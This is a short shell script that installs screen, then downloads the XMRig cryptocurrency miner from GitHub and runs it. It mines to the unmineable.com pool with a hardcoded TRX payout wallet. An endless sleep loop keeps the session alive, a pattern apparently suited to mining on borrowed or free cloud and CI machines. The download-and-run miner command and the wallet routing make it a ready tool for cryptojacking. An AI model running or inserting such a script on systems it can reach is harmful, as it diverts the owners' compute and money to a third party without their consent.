#!/bin/sh
sudo apt update
sudo apt install screen -y
sudo apt-get update && wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz && tar xf xmrig-6.15.1-linux-x64.tar.gz && cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -p x -t 1 -u TRX:TMd7AyZ89cHo8tShH2fhXh13UUJp7ShY5W.Bissmilah#jijg-zcek
while [ 1 ]; do
sleep 3
done
sleep 999
